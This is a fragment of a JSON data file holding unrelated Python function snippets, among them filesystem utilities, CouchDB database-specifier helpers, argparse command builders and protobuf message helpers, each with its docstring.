            "def ReplaceInFile(filename, old, new, encoding=None):\n    '''\n    Replaces all occurrences of \"old\" by \"new\" in the given file.\n\n    :param unicode filename:\n        The name of the file.\n\n    :param unicode old:\n        The string to search for.\n\n    :param unicode new:\n        Replacement string.\n\n    :return unicode:\n        The new contents of the file.\n    '''\n    contents = GetFileContents(filename, encoding=encoding)\n    contents = contents.replace(old, new)\n    CreateFile(filename, contents, encoding=encoding)\n    return contents"
        ],
        [
            "def CreateDirectory(directory):\n    '''\n    Create directory including any missing intermediate directory.\n\n    :param unicode directory:\n\n    :return unicode|urlparse.ParseResult:\n        Returns the created directory or url (see urlparse).\n\n    :raises NotImplementedProtocol:\n        If protocol is not local or FTP.\n\n    .. seealso:: FTP LIMITATIONS at this module's doc for performance issues information\n    '''\n    from six.moves.urllib.parse import urlparse\n    directory_url = urlparse(directory)\n\n    # Handle local\n    if _UrlIsLocal(directory_url):\n        if not os.path.exists(directory):\n            os.makedirs(directory)\n        return directory\n\n    # Handle FTP\n    elif directory_url.scheme == 'ftp':\n        from ._exceptions import NotImplementedProtocol\n        raise NotImplementedProtocol(directory_url.scheme)\n    else:\n        from ._exceptions import NotImplementedProtocol\n        raise NotImplementedProtocol(directory_url.scheme)"
        ],
        [
            "def DeleteDirectory(directory, skip_on_error=False):\n    '''\n    Deletes a directory.\n\n    :param unicode directory:\n\n    :param bool skip_on_error:\n        If True, ignore any errors when trying to delete directory (for example, directory not\n        found)\n\n    :raises NotImplementedForRemotePathError:\n        If trying to delete a remote directory.\n    '''\n    _AssertIsLocal(directory)\n\n    import shutil\n    def OnError(fn, path, excinfo):\n        '''\n        Remove the read-only flag and try to remove again.\n        On Windows, rmtree fails when trying to remove a read-only file. This fix it!\n        Another case: Read-only directories return True in os.access test. It seems that read-only\n        directories has it own flag (looking at the property windows on Explorer).\n        '''\n        if IsLink(path):\n            return\n\n        if fn is os.remove and os.access(path, os.W_OK):\n            raise\n\n        # Make the file WRITEABLE and executes the original delete function (osfunc)\n        import stat\n        os.chmod(path, stat.S_IWRITE)\n        fn(path)\n\n    try:\n        if not os.path.isdir(directory):\n            if skip_on_error:\n                return\n            from ._exceptions import DirectoryNotFoundError\n            raise DirectoryNotFoundError(directory)\n        shutil.rmtree(directory, onerror=OnError)\n    except:\n        if not skip_on_error:\n            raise"
        ],
        [
            "def ListMappedNetworkDrives():\n    '''\n    On Windows, returns a list of mapped network drives\n\n    :return: tuple(string, string, bool)\n        For each mapped netword drive, return 3 values tuple:\n            - the local drive\n            - the remote path-\n            - True if the mapping is enabled (warning: not reliable)\n    '''\n    if sys.platform != 'win32':\n        raise NotImplementedError\n    drives_list = []\n    netuse = _CallWindowsNetCommand(['use'])\n    for line in netuse.split(EOL_STYLE_WINDOWS):\n        match = re.match(\"(\\w*)\\s+(\\w:)\\s+(.+)\", line.rstrip())\n        if match:\n            drives_list.append((match.group(2), match.group(3), match.group(1) == 'OK'))\n    return drives_list"
        ],
        [
            "def CreateLink(target_path, link_path, override=True):\n    '''\n    Create a symbolic link at `link_path` pointing to `target_path`.\n\n    :param unicode target_path:\n        Link target\n\n    :param unicode link_path:\n        Fullpath to link name\n\n    :param bool override:\n        If True and `link_path` already exists as a link, that link is overridden.\n    '''\n    _AssertIsLocal(target_path)\n    _AssertIsLocal(link_path)\n\n    if override and IsLink(link_path):\n        DeleteLink(link_path)\n\n    # Create directories leading up to link\n    dirname = os.path.dirname(link_path)\n    if dirname:\n        CreateDirectory(dirname)\n\n    if sys.platform != 'win32':\n        return os.symlink(target_path, link_path)  # @UndefinedVariable\n    else:\n        #import ntfsutils.junction\n        #return ntfsutils.junction.create(target_path, link_path)\n\n        import jaraco.windows.filesystem\n        return jaraco.windows.filesystem.symlink(target_path, link_path)\n\n        from ._easyfs_win32 import CreateSymbolicLink\n        try:\n            dw_flags = 0\n            if target_path and os.path.isdir(target_path):\n                dw_flags = 1\n            return CreateSymbolicLink(target_path, link_path, dw_flags)\n        except Exception as e:\n            reraise(e, 'Creating link \"%(link_path)s\" pointing to \"%(target_path)s\"' % locals())"
        ],
        [
            "def ReadLink(path):\n    '''\n    Read the target of the symbolic link at `path`.\n\n    :param unicode path:\n        Path to a symbolic link\n\n    :returns unicode:\n        Target of a symbolic link\n    '''\n    _AssertIsLocal(path)\n\n    if sys.platform != 'win32':\n        return os.readlink(path)  # @UndefinedVariable\n\n    if not IsLink(path):\n        from ._exceptions import FileNotFoundError\n        raise FileNotFoundError(path)\n\n    import jaraco.windows.filesystem\n    result = jaraco.windows.filesystem.readlink(path)\n    if '\\\\??\\\\' in result:\n        result = result.split('\\\\??\\\\')[1]\n    return result"
        ],
        [
            "def _AssertIsLocal(path):\n    '''\n    Checks if a given path is local, raise an exception if not.\n\n    This is used in filesystem functions that do not support remote operations yet.\n\n    :param unicode path:\n\n    :raises NotImplementedForRemotePathError:\n        If the given path is not local\n    '''\n    from six.moves.urllib.parse import urlparse\n    if not _UrlIsLocal(urlparse(path)):\n        from ._exceptions import NotImplementedForRemotePathError\n        raise NotImplementedForRemotePathError"
        ],
        [
            "def _HandleContentsEol(contents, eol_style):\n    '''\n    Replaces eol on each line by the given eol_style.\n\n    :param unicode contents:\n    :type eol_style: EOL_STYLE_XXX constant\n    :param eol_style:\n    '''\n    if eol_style == EOL_STYLE_NONE:\n        return contents\n\n    if eol_style == EOL_STYLE_UNIX:\n        return contents.replace('\\r\\n', eol_style).replace('\\r', eol_style)\n\n    if eol_style == EOL_STYLE_MAC:\n        return contents.replace('\\r\\n', eol_style).replace('\\n', eol_style)\n\n    if eol_style == EOL_STYLE_WINDOWS:\n        return contents.replace('\\r\\n', '\\n').replace('\\r', '\\n').replace('\\n', EOL_STYLE_WINDOWS)\n\n    raise ValueError('Unexpected eol style: %r' % (eol_style,))"
        ],
        [
            "def MatchMasks(filename, masks):\n    '''\n    Verifies if a filename match with given patterns.\n\n    :param str filename: The filename to match.\n    :param list(str) masks: The patterns to search in the filename.\n    :return bool:\n        True if the filename has matched with one pattern, False otherwise.\n    '''\n    import fnmatch\n\n    if not isinstance(masks, (list, tuple)):\n        masks = [masks]\n\n    for i_mask in masks:\n        if fnmatch.fnmatch(filename, i_mask):\n            return True\n    return False"
        ],
        [
            "def FindFiles(dir_, in_filters=None, out_filters=None, recursive=True, include_root_dir=True, standard_paths=False):\n    '''\n    Searches for files in a given directory that match with the given patterns.\n\n    :param str dir_: the directory root, to search the files.\n    :param list(str) in_filters: a list with patterns to match (default = all). E.g.: ['*.py']\n    :param list(str) out_filters: a list with patterns to ignore (default = none). E.g.: ['*.py']\n    :param bool recursive: if True search in subdirectories, otherwise, just in the root.\n    :param bool include_root_dir: if True, includes the directory being searched in the returned paths\n    :param bool standard_paths: if True, always uses unix path separators \"/\"\n    :return list(str):\n        A list of strings with the files that matched (with the full path in the filesystem).\n    '''\n    # all files\n    if in_filters is None:\n        in_filters = ['*']\n\n    if out_filters is None:\n        out_filters = []\n\n    result = []\n\n    # maintain just files that don't have a pattern that match with out_filters\n    # walk through all directories based on dir\n    for dir_root, directories, filenames in os.walk(dir_):\n\n        for i_directory in directories[:]:\n            if MatchMasks(i_directory, out_filters):\n                directories.remove(i_directory)\n\n        for filename in directories + filenames:\n            if MatchMasks(filename, in_filters) and not MatchMasks(filename, out_filters):\n                result.append(os.path.join(dir_root, filename))\n\n        if not recursive:\n            break\n\n    if not include_root_dir:\n        # Remove root dir from all paths\n        dir_prefix = len(dir_) + 1\n        result = [file[dir_prefix:] for file in result]\n\n    if standard_paths:\n        result = map(StandardizePath, result)\n\n    return result"
        ],
        [
            "def ExpandUser(path):\n    '''\n    os.path.expanduser wrapper, necessary because it cannot handle unicode strings properly.\n\n    This is not necessary in Python 3.\n\n    :param path:\n        .. seealso:: os.path.expanduser\n    '''\n    if six.PY2:\n        encoding = sys.getfilesystemencoding()\n        path = path.encode(encoding)\n    result = os.path.expanduser(path)\n    if six.PY2:\n        result = result.decode(encoding)\n    return result"
        ],
        [
            "def DumpDirHashToStringIO(directory, stringio, base='', exclude=None, include=None):\n    '''\n    Helper to iterate over the files in a directory putting those in the passed StringIO in ini\n    format.\n\n    :param unicode directory:\n        The directory for which the hash should be done.\n\n    :param StringIO stringio:\n        The string to which the dump should be put.\n\n    :param unicode base:\n        If provided should be added (along with a '/') before the name=hash of file.\n\n    :param unicode exclude:\n        Pattern to match files to exclude from the hashing. E.g.: *.gz\n\n    :param unicode include:\n        Pattern to match files to include in the hashing. E.g.: *.zip\n    '''\n    import fnmatch\n    import os\n\n    files = [(os.path.join(directory, i), i) for i in os.listdir(directory)]\n    files = [i for i in files if os.path.isfile(i[0])]\n    for fullname, filename in files:\n        if include is not None:\n            if not fnmatch.fnmatch(fullname, include):\n                continue\n\n        if exclude is not None:\n            if fnmatch.fnmatch(fullname, exclude):\n                continue\n\n        md5 = Md5Hex(fullname)\n        if base:\n            stringio.write('%s/%s=%s\\n' % (base, filename, md5))\n        else:\n            stringio.write('%s=%s\\n' % (filename, md5))"
        ],
        [
            "def IterHashes(iterator_size, hash_length=7):\n    '''\n    Iterator for random hexadecimal hashes\n\n    :param iterator_size:\n        Amount of hashes return before this iterator stops.\n        Goes on forever if `iterator_size` is negative.\n\n    :param int hash_length:\n        Size of each hash returned.\n\n    :return generator(unicode):\n    '''\n    if not isinstance(iterator_size, int):\n        raise TypeError('iterator_size must be integer.')\n\n    count = 0\n    while count != iterator_size:\n        count += 1\n        yield GetRandomHash(hash_length)"
        ],
        [
            "def PushPopItem(obj, key, value):\n    '''\n    A context manager to replace and restore a value using a getter and setter.\n\n    :param object obj: The object to replace/restore.\n    :param object key: The key to replace/restore in the object.\n    :param object value: The value to replace.\n\n    Example::\n\n      with PushPop2(sys.modules, 'alpha', None):\n        pytest.raises(ImportError):\n          import alpha\n    '''\n    if key in obj:\n        old_value = obj[key]\n        obj[key] = value\n        yield value\n        obj[key] = old_value\n\n    else:\n        obj[key] = value\n        yield value\n        del obj[key]"
        ],
        [
            "def db_to_specifier(db_string):\n    \"\"\"\n    Return the database specifier for a database string.\n    \n    This accepts a database name or URL, and returns a database specifier in the\n    format accepted by ``specifier_to_db``. It is recommended that you consult\n    the documentation for that function for an explanation of the format.\n    \"\"\"\n    local_match = PLAIN_RE.match(db_string)\n    remote_match = URL_RE.match(db_string)\n    # If this looks like a local specifier:\n    if local_match:\n        return 'local:' + local_match.groupdict()['database']\n    # If this looks like a remote specifier:\n    elif remote_match:\n        # Just a fancy way of getting 3 variables in 2 lines...\n        hostname, portnum, database = map(remote_match.groupdict().get,\n            ('hostname', 'portnum', 'database'))\n        local_url = settings._('COUCHDB_SERVER', 'http://127.0.0.1:5984/')\n        localhost, localport = urlparse.urlparse(local_url)[1].split(':')\n        # If it's the local server, then return a local specifier.\n        if (localhost == hostname) and (localport == portnum):\n            return 'local:' + database\n        # Otherwise, prepare and return the remote specifier.\n        return 'remote:%s:%s:%s' % (hostname, portnum, database)\n    # Throw a wobbly.\n    raise ValueError('Invalid database string: %r' % (db_string,))"
        ],
        [
            "def get_db_from_db(db_string):\n    \"\"\"Return a CouchDB database instance from a database string.\"\"\"\n    server = get_server_from_db(db_string)\n    local_match = PLAIN_RE.match(db_string)\n    remote_match = URL_RE.match(db_string)\n    # If this looks like a local specifier:\n    if local_match:\n        return server[local_match.groupdict()['database']]\n    elif remote_match:\n        return server[remote_match.groupdict()['database']]\n    raise ValueError('Invalid database string: %r' % (db_string,))"
        ],
        [
            "def ensure_specifier_exists(db_spec):\n    \"\"\"Make sure a DB specifier exists, creating it if necessary.\"\"\"\n    local_match = LOCAL_RE.match(db_spec)\n    remote_match = REMOTE_RE.match(db_spec)\n    plain_match = PLAIN_RE.match(db_spec)\n    if local_match:\n        db_name = local_match.groupdict().get('database')\n        server = shortcuts.get_server()\n        if db_name not in server:\n            server.create(db_name)\n        return True\n    elif remote_match:\n        hostname, portnum, database = map(remote_match.groupdict().get,\n            ('hostname', 'portnum', 'database'))\n        server = shortcuts.get_server(\n            server_url=('http://%s:%s' % (hostname, portnum)))\n        if database not in server:\n            server.create(database)\n        return True\n    elif plain_match:\n        db_name = plain_match.groupdict().get('database')\n        server = shortcuts.get_server()\n        if db_name not in server:\n            server.create(db_name)\n        return True\n    return False"
        ],
        [
            "def coerce(value1, value2, default=None):\n    \"\"\"Exclude NoSet objec\n\n    .. code-block::\n\n        >>> coerce(NoSet, 'value')\n        'value'\n\n    \"\"\"\n    if value1 is not NoSet:\n        return value1\n    elif value2 is not NoSet:\n        return value2\n    else:\n        return default"
        ],
        [
            "def parse_hub_key(key):\n    \"\"\"Parse a hub key into a dictionary of component parts\n\n    :param key: str, a hub key\n    :returns: dict, hub key split into parts\n    :raises: ValueError\n    \"\"\"\n    if key is None:\n        raise ValueError('Not a valid key')\n\n    match = re.match(PATTERN, key)\n    if not match:\n        match = re.match(PATTERN_S0, key)\n        if not match:\n            raise ValueError('Not a valid key')\n\n        return dict(map(normalise_part, zip([p for p in PARTS_S0.keys()], match.groups())))\n\n    return dict(zip(PARTS.keys(), match.groups()))"
        ],
        [
            "def match_part(string, part):\n    \"\"\"Raise an exception if string doesn't match a part's regex\n\n    :param string: str\n    :param part: a key in the PARTS dict\n    :raises: ValueError, TypeError\n    \"\"\"\n    if not string or not re.match('^(' + PARTS[part] + ')$', string):\n        raise ValueError('{} should match {}'.format(part, PARTS[part]))"
        ],
        [
            "def apply_defaults(self, commands):\n        \"\"\" apply default settings to commands\n            not static, shadow \"self\" in eval\n        \"\"\"\n        for command in commands:\n            if 'action' in command and \"()\" in command['action']:\n                command['action'] = eval(\"self.{}\".format(command['action']))\n            if command['keys'][0].startswith('-'):\n                if 'required' not in command:\n                    command['required'] = False"
        ],
        [
            "def create_commands(self, commands, parser):\n        \"\"\" add commands to parser \"\"\"\n        self.apply_defaults(commands)\n        def create_single_command(command):\n            keys = command['keys']\n            del command['keys']\n            kwargs = {}\n            for item in command:\n                kwargs[item] = command[item]\n            parser.add_argument(*keys, **kwargs)\n\n        if len(commands) > 1:\n            for command in commands:\n                create_single_command(command)\n        else:\n            create_single_command(commands[0])"
        ],
        [
            "def create_subparsers(self, parser):\n        \"\"\" get config for subparser and create commands\"\"\"\n        subparsers = parser.add_subparsers()\n        for name in self.config['subparsers']:\n            subparser = subparsers.add_parser(name)\n            self.create_commands(self.config['subparsers'][name], subparser)"
        ],
        [
            "def show_version(self):\n        \"\"\" custom command line  action to show version \"\"\"\n        class ShowVersionAction(argparse.Action):\n            def __init__(inner_self, nargs=0, **kw):\n                super(ShowVersionAction, inner_self).__init__(nargs=nargs, **kw)\n\n            def __call__(inner_self, parser, args, value, option_string=None):\n                print(\"{parser_name} version: {version}\".format(\n                    parser_name=self.config.get(\n                        \"parser\", {}).get(\"prog\"),\n                    version=self.prog_version))\n        return ShowVersionAction"
        ],
        [
            "def check_path_action(self):\n        \"\"\" custom command line action to check file exist \"\"\"\n        class CheckPathAction(argparse.Action):\n            def __call__(self, parser, args, value, option_string=None):\n                if type(value) is list:\n                    value = value[0]\n                user_value = value\n                if option_string == 'None':\n                    if not os.path.isdir(value):\n                        _current_user = os.path.expanduser(\"~\")\n                        if not value.startswith(_current_user) \\\n                                and not value.startswith(os.getcwd()):\n                            if os.path.isdir(os.path.join(_current_user, value)):\n                                value = os.path.join(_current_user, value)\n                            elif os.path.isdir(os.path.join(os.getcwd(), value)):\n                                value = os.path.join(os.getcwd(), value)\n                            else:\n                                value = None\n                        else:\n                            value = None\n                elif option_string == '--template-name':\n                    if not os.path.isdir(value):\n                        if not os.path.isdir(os.path.join(args.target, value)):\n                            value = None\n                if not value:\n                    logger.error(\"Could not to find path %s. Please provide \"\n                                 \"correct path to %s option\",\n                                 user_value, option_string)\n                    exit(1)\n                setattr(args, self.dest, value)\n\n        return CheckPathAction"
        ],
        [
            "def new_user(yaml_path):\n    '''\n    Return the consumer and oauth tokens with three-legged OAuth process and\n    save in a yaml file in the user's home directory.\n    '''\n\n    print 'Retrieve API Key from https://www.shirts.io/accounts/api_console/'\n    api_key = raw_input('Shirts.io API Key: ')\n\n    tokens = {\n        'api_key': api_key,\n    }\n\n    yaml_file = open(yaml_path, 'w+')\n    yaml.dump(tokens, yaml_file, indent=2)\n    yaml_file.close()\n\n    return tokens"
        ],
        [
            "def _AddPropertiesForExtensions(descriptor, cls):\n  \"\"\"Adds properties for all fields in this protocol message type.\"\"\"\n  extension_dict = descriptor.extensions_by_name\n  for extension_name, extension_field in extension_dict.items():\n    constant_name = extension_name.upper() + \"_FIELD_NUMBER\"\n    setattr(cls, constant_name, extension_field.number)"
        ],
        [
            "def _InternalUnpackAny(msg):\n  \"\"\"Unpacks Any message and returns the unpacked message.\n\n  This internal method is differnt from public Any Unpack method which takes\n  the target message as argument. _InternalUnpackAny method does not have\n  target message type and need to find the message type in descriptor pool.\n\n  Args:\n    msg: An Any message to be unpacked.\n\n  Returns:\n    The unpacked message.\n  \"\"\"\n  type_url = msg.type_url\n  db = symbol_database.Default()\n\n  if not type_url:\n    return None\n\n  # TODO(haberman): For now we just strip the hostname.  Better logic will be\n  # required.\n  type_name = type_url.split(\"/\")[-1]\n  descriptor = db.pool.FindMessageTypeByName(type_name)\n\n  if descriptor is None:\n    return None\n\n  message_class = db.GetPrototype(descriptor)\n  message = message_class()\n\n  message.ParseFromString(msg.value)\n  return message"
        ]
    ]
}